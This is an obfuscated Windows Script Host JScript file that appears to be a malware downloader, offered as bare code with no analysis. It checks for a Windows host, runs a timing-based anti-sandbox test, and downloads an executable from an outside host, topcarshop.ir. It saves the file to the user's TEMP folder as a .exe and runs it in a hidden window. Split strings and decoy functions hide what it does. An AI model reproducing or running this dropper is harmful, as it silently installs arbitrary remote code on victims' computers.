var _YT = false;
var _K = "CreateObject";
var _P = function _MI() {return WScript[_K]("WScript"+".Shell");}(), _G = 11;
var _WG = "MSXML2.XMLHTTP";
var _BT = 2123213;
var _H = 0;
function _I(_Z1){_P["Run"](_Z1, _H, _H);};
function _SH(){return _WG + "";};
function _R(_LQ0, _Q){_H = _H * 1; return _LQ0 - _Q;};
function _CB(){return _K;};
/*@cc_on
  @if (@_win32 || @_win64)
    _YT = true;
  @end
@*/
if (_YT)
{
var _C = "";
function _X(){return 22;};
var _I0 = 0; var _W0 = 0;
function _L0()
{
var _V1 = new this["Date"]();
var _V0 = _V1["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _V1 = new this["Date"]();
var _Z0 = _V1["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _V1 = new this["Date"]();
var _V = _V1["getUTCMilliseconds"]();
var _I0 = "_D";
_I0 = _R(_Z0, _V0);
var _W0 = "_Z";
_W0 = _R(_V, _Z0);
_C = "open";
return _R(_I0, _W0);
}
var _XU = false;
var _UA = false;
for (var _R0 = _H; _R0 < _X() * 1; _R0++){if (_L0() != _H){
_XU = true; 
_W0 = "31" + 11 * _I0 + _W0; 
_UA = true; 
break;
}}
function _W() {return ((_XU == true) && (_XU == _UA)) ? 1 : _H;};
if (_XU && _W() && _UA){
function _VR() {return _P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "is1A53Ctvs6.ex" + "e";};
 _E = _SH();
 _P0 = WScript[_K](_E);
 var _B = 1;
 while (_B){
try {
	if (_B == 1)
	{
		_P0[_C]("GET", "http://topcarshop.ir/m1kas", false);
		_P0["send"]();
		_AK = "Sleep";
	}
	WScript[_AK](_X() + 120); 
	if (_P0["readystate"] < 2 * 2) continue;
	_B = _H;
	function _L(_QI) {var _D0 = (1, 2, 3, 4, 5, _QI); return _D0;};
	_LQ = WScript[_CB()]("ADODB.Stream");
	_E = _LQ;
	_E[_C]();
	_E["type"] = _L(1);
	_E["write"](_P0["ResponseBody"]);
	_LQ["position"] = _L(_H);
	_E["Save" + "ToFile"](_VR(), 2);
	_LQ["cl"+"ose"]();
	_NO = _VR();
	_I(_NO);
} catch(_XO){};
}
}
}

